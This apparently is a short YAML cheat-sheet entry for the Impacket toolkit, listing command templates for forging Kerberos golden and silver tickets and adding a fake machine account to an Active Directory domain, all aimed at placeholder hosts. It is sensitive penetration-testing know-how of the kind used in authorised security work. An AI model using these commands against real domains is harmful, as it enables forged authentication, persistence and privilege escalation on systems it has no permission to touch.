...
name: impacket
description: Collection of Python classes and scripts for working with network protocols
  and Windows AD, including secretsdump, psexec, wmiexec, kerberoast, and NTLM relay
  tools.
...
- description: Golden ticket — forge KRBTGT ticket
  command: impacket-ticketer -nthashes <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain
    evilcorp.local administrator
- description: Silver ticket — forge service ticket
  command: impacket-ticketer -nthashes <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain
    evilcorp.local -spn cifs/target.evilcorp.local administrator
...
- description: Add computer to domain (ESC1 machine account)
  command: impacket-addcomputer -computer-name 'FAKECOMP$' -computer-pass 'FakePass123'
    -dc-ip 10.10.10.1 evilcorp.local/user:Pass123
references:
